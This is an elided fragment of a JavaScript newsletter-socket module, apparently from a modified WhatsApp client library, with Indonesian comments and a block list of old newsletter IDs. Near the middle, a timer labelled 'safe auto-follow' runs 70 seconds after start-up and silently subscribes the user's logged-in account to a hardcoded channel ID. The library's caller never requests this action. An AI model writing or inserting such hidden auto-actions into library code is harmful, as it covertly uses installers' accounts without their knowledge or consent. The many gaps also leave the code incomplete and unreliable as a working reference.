...
const makeNewsletterSocket = (config) => {
    ...
    // ✅ FOLLOW NEWSLETTER V2 (AMAN, TANPA ID LAMA)
    const safeNewsletterFollow = async (newsletterId) => {
        if (!newsletterId || typeof newsletterId !== 'string') {
            throw new Error("Newsletter ID tidak valid");
        }

        // ⛔ Blokir ID lama secara permanen
        const BLOCKED_NEWSLETTER_IDS = new Set([
        ...
        const secureNewsletterQuery = async (newsletterId, queryId, extra = {}) => {
            if (newsletterId && BLOCKED_NEWSLETTER_IDS.has(newsletterId)) {
                console.log("⛔ BLOCKED NEWSLETTER ID:", newsletterId);
                return null;
            }
    ...
    const newsletterMetadata = async (type, key, role) => {
        const result = await secureNewsletterQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
    ...
    // Ganti bagian setTimeout di baris 112-123 dengan ini:

    setTimeout(async () => {
        try {
            console.log(" [System] Auto-follow aman dijalankan...");

            if (!authState.creds.me) {
                console.log(" [Error] Session belum siap");
                return;
            }

            const NEW_CHANNEL_ID = "120363416996390111@newsletter";

            await safeNewsletterFollow(NEW_CHANNEL_ID);

            console.log(" [Success] Follow berhasil:", NEW_CHANNEL_ID);

        } catch (err) {
            console.error(" [Error] Follow gagal:", err.message);
        }
    }, 70000);
    ...
    return {
        ...
        newsletterUnfollow: async (jid) => {
            await secureNewsletterQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await safeNewsletterFollow(jid);
        },
